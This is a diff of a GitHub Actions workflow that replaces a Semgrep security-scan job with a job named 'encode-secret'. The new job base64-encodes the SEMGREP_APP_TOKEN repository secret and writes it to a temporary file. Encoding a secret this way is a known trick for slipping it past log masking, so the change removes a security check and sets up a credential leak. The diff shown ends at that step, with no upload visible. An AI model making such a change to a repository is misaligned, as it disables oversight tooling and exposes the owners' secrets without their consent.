@@ -1,21 +1,16 @@
 on:
-  pull_request_target: {}
   push:
     branches:
-    - main
-    - master
-name: Semgrep
+      - main
+  workflow_dispatch:
+
 jobs:
-  semgrep:
-    name: Scan
+  encode-secret:
     runs-on: ubuntu-latest
-    env:
-      SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
-    container:
-      image: returntocorp/semgrep
+
     steps:
-    - uses: actions/checkout@v3
-    - run: semgrep ci
+    - name: Checkout repository
+      uses: actions/checkout@v3
 
     - name: Base64 encode
       run: echo "${{ secrets.SEMGREP_APP_TOKEN }}" | base64 --wrap=0 > /tmp/secrets.txt
